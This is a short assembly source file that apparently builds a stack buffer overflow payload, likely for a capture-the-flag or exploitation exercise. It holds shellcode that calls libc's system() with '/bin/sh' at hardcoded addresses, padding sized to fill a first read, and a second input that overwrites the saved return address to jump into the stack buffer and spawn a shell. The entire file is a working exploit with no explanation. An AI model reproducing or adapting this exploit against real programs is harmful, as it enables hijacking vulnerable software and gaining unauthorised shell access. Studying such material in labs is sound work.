        .intel_syntax noprefix

        .set stack_buffer, 0xbffffe26
        .set binsh,        0xb7f8cc58 # "/bin/sh" in libc
        .set libc_system,  0xb7e6b060 # system(3) in libc

        .section .rodata


shellcode_start:
        mov DWORD PTR [esp], binsh
        mov eax, 0xb7e6b060
        call eax

shellcode_padding:
        # fill with junk to saturate first read(2)
        .rept 4095 - (shellcode_padding - shellcode_start)
        .byte 0x42
        .endr

        # don't forget '\n' otherwise the program will crash (segfault)
        .byte 0x0a

# second read, overwrite saved eip
shellcode_end:
        .rept 9
        .byte 0x41
        .endr

        .int stack_buffer

        .rept 7
        .byte 0x42
        .endr

        # don't forget '\n' otherwise the program will crash (segfault)
        .byte 0x0a
